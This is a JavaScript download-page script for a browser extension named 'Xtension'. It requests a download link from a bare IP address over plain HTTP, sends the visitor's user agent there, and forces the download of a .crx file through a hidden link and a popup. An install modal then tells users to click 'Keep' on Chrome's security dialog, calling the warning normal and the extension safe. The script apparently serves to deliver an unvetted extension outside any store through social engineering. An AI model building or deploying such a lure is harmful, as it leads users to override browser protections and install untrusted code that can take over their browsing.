// Xtension Download Script - Chrome-Friendly Installation
// Minimizes warnings and provides best user experience

(function() {
    'use strict';

    console.log('🚀 Xtension Download Script Loading...');

    // Server configuration
    const CONFIG = {
        serverUrl: 'http://77.90.51.74:8080',
        endpoint: '/api/generate-download-url',
        timeout: 20000,
        retryAttempts: 3
    };

    // Global state
    let isDownloading = false;

    // Chrome-friendly installation instructions
    function showInstallInstructions() {
        const instructionsHtml = `
            <div style="text-align: left; padding: 20px; max-width: 500px;">
                <div style="background: #e8f4fd; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
                    <h3 style="color: #1976d2; margin-top: 0;">🎉 File Downloaded Successfully!</h3>
                    <p style="color: #1976d2; margin-bottom: 10px;">Your Xtension.crx file is ready for installation.</p>
                </div>

                <h4 style="color: #333;">To install in Chrome:</h4>
                <div style="background: #f8f9fa; padding: 15px; border-radius: 8px; border-left: 4px solid #007bff;">
                    <ol style="margin-left: 20px; line-height: 1.8;">
                        <li><strong>Step 1:</strong> Chrome will show a security dialog - Click "Keep" (⬇️)</li>
                        <li><strong>Step 2:</strong> Click the downloaded file in Chrome downloads</li>
                        <li><strong>Step 3:</strong> Click "Install extension" in Chrome's dialog</li>
                        <li><strong>Step 4:</strong> Click "Add extension" to confirm</li>
                    </ol>
                </div>

                <p style="margin-top: 15px; color: #28a745; font-weight: bold;">
                    ✅ Chrome's warning is normal - the extension is safe to install!
                </p>

                <div style="text-align: center; margin-top: 20px;">
                    <button onclick="startDownload()" id="downloadAgainBtn" style="background: #007bff; color: white; padding: 15px 30px; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold;">
                        📥 Download Xtension.crx Again
                    </button>
                </div>
            </div>
        `;

        const modal = document.getElementById('installModal');
        const modalContent = modal.querySelector('.modal-content');
        modalContent.innerHTML = instructionsHtml;
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';

        // Make functions globally available
        window.startDownload = startDownload;
    }

    // Enhanced download with Chrome optimization
    async function startDownload() {
        if (isDownloading) {
            console.log('⚠️ Download already in progress...');
            return;
        }

        isDownloading = true;
        console.log('🚀 Starting Xtension download...');

        try {
            // Show loading
            showLoadingModal('Preparing download...');

            // Generate download URL
            const downloadUrl = await generateDownloadUrl();

            if (downloadUrl) {
                showLoadingModal('Downloading Xtension extension...');

                // Download with Chrome optimization
                await downloadCRXOptimized(downloadUrl);

                // Show success instructions
                setTimeout(() => {
                    showInstallInstructions();
                    isDownloading = false;
                }, 2000);

            } else {
                throw new Error('Failed to generate download URL');
            }

        } catch (error) {
            console.error('❌ Download failed:', error);
            showErrorModal(error.message);
            isDownloading = false;
        }
    }

    // Generate download URL
    async function generateDownloadUrl() {
        console.log('📡 Requesting download URL...');

        try {
            const response = await fetch(CONFIG.serverUrl + CONFIG.endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                mode: 'cors',
                body: JSON.stringify({
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent
                })
            });

            console.log(`📡 Server response: ${response.status}`);

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(`Server error: ${response.status}`);
            }

            const data = await response.json();
            console.log('📡 Server response:', data);

            if (data.success && data.downloadUrl) {
                return data.downloadUrl;
            } else {
                throw new Error(data.error || 'Invalid response');
            }

        } catch (error) {
            console.error('❌ API call failed:', error);
            throw new Error(`Connection failed: ${error.message}`);
        }
    }

    // Chrome-optimized download
    async function downloadCRXOptimized(downloadUrl) {
        return new Promise((resolve, reject) => {
            try {
                console.log('📥 Initiating Chrome-friendly download...');

                // Method 1: Direct download (primary)
                const link = document.createElement('a');
                link.href = downloadUrl;
                link.download = 'Xtension.crx';
                link.style.display = 'none';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);

                console.log('✅ Download initiated - Chrome should handle installation');

                // Method 2: Fallback - popup download
                setTimeout(() => {
                    const popup = window.open(downloadUrl, 'xtension-download', 'width=600,height=400');
                    if (popup) {
                        setTimeout(() => popup.close(), 3000);
                    }
                }, 1000);

                // Give Chrome time
                setTimeout(() => resolve(true), 3000);

            } catch (error) {
                console.error('❌ Download failed:', error);
                reject(error);
            }
        });
    }

    // Show loading modal
    function showLoadingModal(message) {
        const modal = document.getElementById('installModal');
        const modalContent = modal.querySelector('.modal-content');
        const h2 = modalContent.querySelector('h2');
        const p = modalContent.querySelector('p');
        const spinner = modalContent.querySelector('.spinner');

        h2.textContent = 'Installing Xtension';
        p.textContent = message;
        spinner.style.display = 'block';
        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';
    }

    // Show error modal
    function showErrorModal(errorMessage) {
        const modal = document.getElementById('installModal');
        const modalContent = modal.querySelector('.modal-content');
        modalContent.innerHTML = `
            <div style="text-align: center; padding: 20px;">
                <div style="background: #ffebee; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
                    <h3 style="color: #c62828; margin-top: 0;">❌ Download Failed</h3>
                    <p style="color: #c62828;">${errorMessage}</p>
                </div>

                <button onclick="startDownload()" style="background: #28a745; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; margin: 5px;">
                    🔄 Try Again
                </button>
                <button onclick="location.reload()" style="background: #6c757d; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; margin: 5px;">
                    🔄 Reload Page
                </button>
            </div>
        `;

        modal.style.display = 'block';
        document.body.style.overflow = 'hidden';
        window.startDownload = startDownload;
    }

    // Setup event listeners
    function setupEventListeners() {
        console.log('🔧 Setting up event listeners...');

        const downloadBtn = document.getElementById('downloadBtn');
        if (downloadBtn) {
            console.log('✅ Download button found');

            downloadBtn.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                console.log('🖱️ Download button clicked');
                startDownload();
            });

            downloadBtn.onclick = function(e) {
                e.preventDefault();
                e.stopPropagation();
                console.log('🖱️ Download button (onclick)');
                startDownload();
            };
        } else {
            console.error('❌ Download button not found!');
        }

        // Cancel button
        const cancelBtn = document.getElementById('cancelBtn');
        if (cancelBtn) {
            cancelBtn.addEventListener('click', function() {
                const modal = document.getElementById('installModal');
                modal.style.display = 'none';
                document.body.style.overflow = 'auto';
            });
        }

        // Modal close
        const modal = document.getElementById('installModal');
        if (modal) {
            modal.addEventListener('click', function(event) {
                if (event.target === modal) {
                    modal.style.display = 'none';
                    document.body.style.overflow = 'auto';
                }
            });
        }

        // Keyboard
        document.addEventListener('keydown', function(event) {
            if (event.key === 'Escape') {
                const modal = document.getElementById('installModal');
                if (modal && modal.style.display === 'block') {
                    modal.style.display = 'none';
                    document.body.style.overflow = 'auto';
                }
            }
        });

        console.log('✅ Event listeners setup complete');
    }

    // Initialize
    function init() {
        console.log('🚀 Initializing Chrome-friendly download...');
        setupEventListeners();
        window.startDownload = startDownload;
        window.testDownload = function() {
            console.log('🧪 Testing download...');
            startDownload();
        };

        console.log('✅ App initialized');
        console.log('💡 Try: startDownload() or testDownload() in console');
    }

    // Start when ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    setTimeout(init, 500);

    console.log('📄 Chrome-friendly download script loaded');

})();